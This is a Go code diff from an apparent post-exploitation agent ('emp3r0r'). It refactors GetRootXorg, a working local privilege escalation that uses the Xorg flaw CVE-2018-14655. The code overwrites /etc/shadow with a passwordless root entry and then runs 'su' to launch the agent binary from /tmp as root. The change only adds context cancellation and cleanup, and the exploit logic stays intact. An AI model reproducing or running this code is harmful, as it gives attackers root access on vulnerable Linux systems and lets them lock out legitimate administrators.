@@ -1,6 +1,7 @@
 package agent
 
 import (
+	"context"
 	"errors"
 	"fmt"
 	"log"
@@ -18,38 +19,48 @@ import (
 
 // GetRoot all-in-one
 func GetRoot() (err error) {
-	return GetRootXorg()
+	ctx, cancel := context.WithCancel(context.Background())
+	return GetRootXorg(ctx, cancel)
 }
 
 // GetRootXorg get root via xorg lpe CVE-2018-14655
-func GetRootXorg() (err error) {
-	var (
-		out []byte
-	)
+func GetRootXorg(ctx context.Context, cancel context.CancelFunc) (err error) {
+	var out []byte
+	defer func() {
+		cancel()
+		err = os.Chdir(AgentRoot)
+		if err != nil {
+			log.Printf("failed to cd back to %s", AgentRoot)
+		}
+	}()
 
 	if os.Chdir("/etc") != nil {
 		return errors.New("Cannot cd to /etc")
 	}
 	exp := exec.Command("Xorg", "-fp", "root::16431:0:99999:7:::", "-logfile", "shadow", ":1")
 	go func() {
+		if ctx.Err() != nil {
+			return
+		}
 		out, err = exp.CombinedOutput()
 		if err != nil &&
 			!strings.Contains(err.Error(), "signal: killed") {
 			log.Printf("start xorg: %s\n%v", out, err)
+			cancel()
 		}
 	}()
 	time.Sleep(5 * time.Second)
-	err = exp.Process.Kill()
-	if err != nil {
-		return fmt.Errorf("failed to kill Xorg: %s\n%v", out, err)
+	if ctx.Err() != nil {
+		return fmt.Errorf("failed to run Xorg: %s\n%v", out, err)
+	}
+	if proc := exp.Process; proc != nil {
+		err = exp.Process.Kill()
+		if err != nil {
+			return fmt.Errorf("failed to kill Xorg: %s\n%v", out, err)
+		}
 	}
 
 	log.Println("GetRootXorg shadow is successfully overwritten")
-
-	err = os.Chdir(AgentRoot)
-	if err != nil {
-		return fmt.Errorf("failed to cd back to %s", AgentRoot)
-	}
 
 	su := exec.Command("su", "-c /tmp/emp3r0r")
 	_, err = pty.Start(su)
